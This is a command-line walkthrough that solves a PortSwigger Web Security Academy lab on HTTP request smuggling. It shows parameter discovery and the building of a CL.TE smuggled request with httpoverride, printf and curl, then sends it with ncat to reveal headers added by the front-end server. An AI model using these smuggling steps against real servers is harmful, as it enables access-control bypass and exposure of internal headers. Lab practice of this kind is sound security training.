# Examples


The aim is to perform request smuggling from command line. The aim is not to totally replace Burp Suite but to propose another approach., with more CLi.

**Why That?**
* To learn
* Be able to solve challenge from CLi enable us to script resolution, automate exploit etc ...

The following examples are an alternative to PortSwigger Burp solutions provided for the PortSwigger Burp academy. They use:
* [`httpcustomhouse`](https://github.com/ariary/HTTPCustomHouse): to simulate server behavior regarding `Content-Length` and chunk encoding
* [`httpoverride`](https://github.com/ariary/HTTPCustomHouse): to change headers of raw request for people not at ease with `sed` 
* [`httpecho`](https://github.com/ariary/httpecho): HTTP echo server echoing request exactly as it is received
* [`httpclient`](https://github.com/ariary/HTTPCustomHouse): `curl` for raw packet because curl, golang http client rewrite packet and `ncat` or `openssl s_client` aren't satisfying

Also to reproduce steps, Export an env var for the lab endpoint:
```shell
export LAB_URL=[YOUR_LAB_URL]
```

## [Exploiting HTTP request smuggling to reveal front-end request rewriting](https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting)


Browsing `/admin` endpoint we've got: `Admin interface only available if logged in as an administrator, or if requested from 127.0.0.1`

We also know that:
* The front-end server adds an HTTP header to incoming requests containing their IP address. We have to find its name
* The front-end does not support chunk encoding


### I - Find a POST parameter that is reflected in response
use [`arjun`](https://github.com/s0md3v/Arjun), a tool to detect parameters for URL:
```shell
arjun -u https://$LAB_URL
[...]
[+] Heuristic scanner found 1 parameter: search
```

Confirm with it curl request:
```shell
curl -X POST https://$LAB_URL -s --data "search=toto" | grep "toto" -C 10 --color
[...]                    <section class=blog-header>
                        <h1>0 search results for 'toto'</h1>
                        <hr>
                    </section>
[...]
```
Indeed, the `search` parameter is reflected in h1 tag

### II - Construct legitimate request that reflect parameters
```shell
# in one shell
httpecho -d search
# in another shell
curl -X POST http://localhost:8888/ --data "search=toto" -H "Host: $LAB_URL" -H 'User-Agent:'  -H 'Accept:'
# empty headers to withdraw curl default ones
```

### III - Smuggle this request to the back-end server, followed directly by a normal request whose rewritten form you want to reveal

To smuggle the request "embed" it in a normal request. The request will include a large Content-Length. As the back-end use it, it will also include the first characters of the next request (which is provided by front end) **=> Added front-end headers can thus be accessible in the response 💥 **

To construct this request:

**1.** Modify the search request with a larger `Content-Length` + w/o `Host` + add `Connection: close` (close teh Connection between server and client to be sure to get the response):
```shell
cat search | httpoverride -H Content-Length -v 200 | httpoverride -H Host -d | httpoverride -H Connection -v close > search_modify
```

**2.** Add end of chunk encoding before the `search_modify` request, it is the payload:
```shell
# Add end of chunk encoding:
printf "0\r\n\r\n$(cat search_modify)" > payload
```

**3.** Construct the smuggle request (with `httpecho`):
```shell
curl -s -X POST http://localhost:8888/ --data-binary "@payload" -H "Host: $LAB_URL" -H 'User-Agent:'  -H 'Accept:' | httpoverride -H Transfer-Encoding -v chunked > smuggle
```

Send the request:
```shell
cat smuggle| ncat --ssl $LAB_URL 443
```
